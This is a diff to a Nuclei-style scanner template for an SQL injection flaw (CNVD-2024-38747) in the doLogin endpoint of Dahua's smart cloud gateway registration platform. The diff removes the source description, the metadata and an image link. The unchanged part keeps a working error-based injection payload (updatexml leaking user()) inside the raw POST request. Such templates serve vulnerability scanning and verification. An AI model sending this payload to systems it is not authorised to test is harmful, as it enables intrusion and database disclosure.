@@ -3,12 +3,8 @@ info:
   name: 大华智能云网关注册管理平台doLogin  SQL注入漏洞(CNVD-2024-38747)
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ai46xbx701bypsib'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ai46xbx701bypsib
-    fofa: title="智能云网关注册管理平台"
 http:
 - raw:
   - 'POST /index.php/User/doLogin HTTP/1.1
@@ -26,9 +22,7 @@ http:
     Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 
 
-    username=1'')and+updatexml(1,concat(0x7e,user(),0x7e),1)--+&password=
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1729347126395-073bcc94-19d0-4220-9dbb-3c4e71ab6522.png)'
+    username=1'')and+updatexml(1,concat(0x7e,user(),0x7e),1)--+&password='
   redirects: false
   matchers:
   - status:
